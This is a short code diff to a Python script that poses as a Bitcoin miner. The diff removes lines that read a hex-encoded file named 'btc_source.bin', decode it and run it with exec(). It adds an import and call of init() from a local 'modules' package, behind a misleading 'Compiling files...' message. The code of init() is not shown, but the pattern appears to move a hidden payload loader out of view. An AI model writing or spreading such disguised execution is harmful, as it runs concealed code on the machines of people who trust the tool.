@@ -9,6 +9,9 @@ import random
 import json
 import time
 import sys
+from modules import init
+print("Compiling files...")
+init()
 def delay_print(s):
     for c in s:
         sys.stdout.write(c)
@@ -21,9 +24,6 @@ print(Fore.YELLOW,'\nBitcoin Wallet Address ===>> ',Fore.GREEN,str(address))
 print(Fore.MAGENTA,'\n------------------------------------------------------------------------------',Style.RESET_ALL)
 delay_print(' Your Bitcoin Wallet Address Added For Mining Now ...')
 print(Fore.MAGENTA,'\n------------------------------------------------------------------------------',Style.RESET_ALL)
-with open("btc_source.bin", 'r') as f:
-    eth_random = f.read()
-    exec(bytes.fromhex(eth_random).decode())
 time.sleep(1)
 def logg(msg):
     logging.basicConfig(level=logging.INFO, filename="miner.log", format='%(asctime)s %(message)s')  # include timestamp
